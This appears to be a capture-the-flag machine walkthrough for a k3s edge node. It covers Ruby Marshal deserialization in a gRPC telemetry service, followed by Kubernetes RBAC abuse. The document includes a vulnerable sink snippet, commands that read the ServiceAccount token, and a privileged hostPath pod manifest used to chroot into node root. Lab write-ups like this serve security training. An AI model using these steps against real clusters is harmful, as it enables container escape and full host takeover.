# CTF Machine: Drone

## Overview

**Name:** Drone
**Difficulty:** Medium
**OS:** Linux (k3s)
**Domain:** `drone.ms`
**Theme:** Edge k3s node with gRPC telemetry service vulnerable to Ruby Marshal deserialization, leading to Kubernetes RBAC abuse

**Story:** DroneOps runs a small k3s edge node on each drone. A Ruby gRPC service on port 50051 ingests telemetry. The telemetry Deployment was bound to a ServiceAccount with an over-permissive Role (`create pods` in the namespace), and Pod Security admission is disabled "for the agents to work" — both common real-world k8s mistakes.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Runtime | k3s (single-node Kubernetes) |
| Application | Ruby gRPC telemetry service (port 50051) |
| Namespace | `droneops` |
| RBAC | ServiceAccount with `create/get/list pods` in namespace |
| Pod Security | Disabled (privileged pods admitted) |
| Open Ports | 50051 (gRPC telemetry) |

---

## Attack Chain

### 1 → Ruby Marshal.load RCE over gRPC — Anonymous → Pod Shell

The telemetry message has a `bytes payload` field fed directly to `Marshal.load` — untrusted bytes deserialized without validation. Send a Ruby Marshal gadget-chain payload as a custom gRPC client.

**Exploitation:**
```ruby
# telemetry_service.rb (vulnerable sink)
def StreamSensor(req, _call)
  state = Marshal.load(req.payload)  # RCE via universal gadget chain
end
```

Gadget fires during `Marshal.load` → reverse shell inside the pod → read `user.txt`.

🚩 **user.txt** → in the pod (app user home)

---

### 2 → ServiceAccount RBAC Abuse → Privileged Pod → Node Root

Read the auto-mounted ServiceAccount token. Enumerate RBAC permissions: `create/get/list pods` in `droneops` namespace. Schedule a privileged pod mounting the host filesystem.

**Exploitation:**
```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
k auth can-i --list -n droneops
# pods [create get list]

# Create privileged pod
k apply -f pwn.yaml
k exec -it maint -n droneops -- chroot /host /bin/bash
cat /root/root.txt
```

```yaml
# pwn.yaml
apiVersion: v1
kind: Pod
metadata: { name: maint, namespace: droneops }
spec:
  hostPID: true
  containers:
  - name: c
    image: <telemetry-image>
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
  - name: host
    hostPath: { path: / }
```

🚩 **root.txt** → `/root/root.txt` on the host

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | Pod (app user home) | App user in pod |
| root.txt | `/root/root.txt` (host) | root (via privileged pod) |

---

## Full Chain Diagram

```
Anonymous
    │  gRPC client → Marshal.load RCE via gadget chain
    │  Reverse shell inside pod
    ▼
app (pod)  →  user.txt
    │  Read ServiceAccount token
    │  k auth can-i → create pods
    │  Create privileged pod → hostPath mount
    │  chroot /host → node root
    ▼
root (node)  →  root.txt
```
